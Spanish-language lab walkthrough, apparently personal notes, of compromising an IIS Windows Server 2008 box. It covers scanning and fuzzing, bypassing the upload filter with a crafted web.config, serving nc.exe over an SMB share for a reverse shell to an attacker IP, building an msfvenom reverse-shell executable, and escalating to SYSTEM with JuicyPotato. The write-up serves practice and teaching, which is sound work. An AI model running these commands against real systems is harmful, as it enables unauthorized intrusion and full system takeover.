Hacemos el escaneo de nmap:
![[Pasted image 20240809145436.png]]
Esto corre por el puerto 80:
![[Pasted image 20240908120758.png]]
Si hacemos fuzzing web vemos un archivo llamado zoc.aspx:
![[Pasted image 20240908120853.png]]
Visualizamos este zoc.aspx:
![[Pasted image 20240908121545.png]]
Probamos en subir un archivo aspx:
```bash
find / -name shell.aspx 2>/dev/null
```
Pero no podemos subir archivos aspx:
![[Pasted image 20240908121720.png]]
Vamos a abrir burpsuite para probar muchas extensiones a ver si alguna de ellas es compatible con el intruder de burp suite:
![[Pasted image 20240908121926.png]]
Y usaremos algún diccionario específico de extensiones:
![[Pasted image 20240908122051.png]]
Pero por aquí no vemos nada:
![[Pasted image 20240908122307.png]]
En hacktricks nos dicen que podemos subir un archivo .aspx:
```bash
https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-web/iis-internet-information-services
```
![[Pasted image 20240908122502.png]]
Y se nos ofrece un ejemplo para descargar un .config:
![[Pasted image 20240908122532.png]]
![[Pasted image 20240908122551.png]]
Copiamos el contenido de este archivo y nos creamos un web.config, el cual vemos que se sube bien:
![[Pasted image 20240908122649.png]]
Pero desconocemos donde se subió este archivo, por lo que si miramos el código fuente de esta url podemos ver un directorio llamado /Subiditosdetono:
![[Pasted image 20240908122757.png]]
Y ahora sí encontramos el pwned.config:
![[Pasted image 20240908122950.png]]
Ahora vamos a hacer la intrusión, copiando el netcat.exe de nuestro Kali, creando un recurso compartido y obtenerlo desde la máquina víctima:
```bash
cp /usr/share/windows-binaries/nc.exe .
impacket-smbserver -smb2support recurso .
```
![[Pasted image 20240908123135.png]]
Y ahora nos recibimos la reverse shell:
```bash
\\192.168.122.160\recurso\nc.exe -e cmd 192.168.122.160 443
```
![[Pasted image 20240908123246.png]]
![[Pasted image 20240908123319.png]]
Una vez dentro, vamos a ejecutar el comando `whoami /priv` para conocer qué privilegios tiene mi actual usuario, y vemos el de SeImpersonatePrivilege:
![[Pasted image 20240908123424.png]]
Nos descargamos el juicypotato:
```bash
https://github.com/ohpe/juicy-potato/releases/tag/v0.1
```
Y también nos creamos una shell.exe con msfvenom que será lo que ejecutemos como el usuario administrador con el juicypotato:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.160 LPORT=4444 -f exe -o shell.exe
```
![[Pasted image 20240908123733.png]]
Nos lo compartimos y lo descargamos en la máquina víctima:
```bash
copy \\192.168.122.160\recurso\shell.exe shell.exe
```
![[Pasted image 20240908124243.png]]
Y lo mismo con el juicypotato.exe:
```bash
copy \\192.168.122.160\recurso\JuicyPotato.exe JuicyPotato.exe
```
![[Pasted image 20240908124351.png]]
Ahora necesitamos conocer el CLSID, por lo que tenemos la siguiente url:
```bash
https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
```
![[Pasted image 20240908125131.png]]
Comprobamos nuestra versión de windows con el comando systeminfo:
![[Pasted image 20240908125314.png]]
En la web ponemos windows server 2008, donde usaremos el primero de ellos:
![[Pasted image 20240908125412.png]]
Ejecutamos el siguiente comando pasandole el CLSID correspondiente, lo cual es un identificador que se utiliza para cada versión de windows:
```bash
JuicyPotato.exe -l 4444 -p shell.exe -t * -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
```
Y recibimos la conexión:
![[Pasted image 20240908125001.png]]
